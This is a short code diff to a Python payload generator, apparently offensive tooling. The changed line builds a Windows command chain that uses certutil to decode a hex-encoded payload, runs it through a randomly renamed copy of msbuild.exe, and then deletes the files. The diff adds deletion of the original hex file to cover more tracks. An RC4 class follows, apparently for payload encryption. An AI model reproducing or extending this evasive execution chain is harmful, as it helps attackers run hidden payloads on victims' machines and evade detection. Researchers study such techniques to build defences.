@@ -109,7 +109,7 @@ class Generator:
 			msbuild = self.gen_process()
 		else:
 			msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
-		payload += " && certutil -decodehex %s %s && copy msbuild.exe %s && %s %s && del %s && del %s" % (filepath[0], filepath[1], msbuild, msbuild, filepath[1], msbuild, filepath[1])
+		payload += " && certutil -decodehex %s %s && copy msbuild.exe %s && %s %s && del %s && del %s && del %s" % (filepath[0], filepath[1], msbuild, msbuild, filepath[1], msbuild, filepath[1], filepath[0])
 		return payload
 
 class RC4:
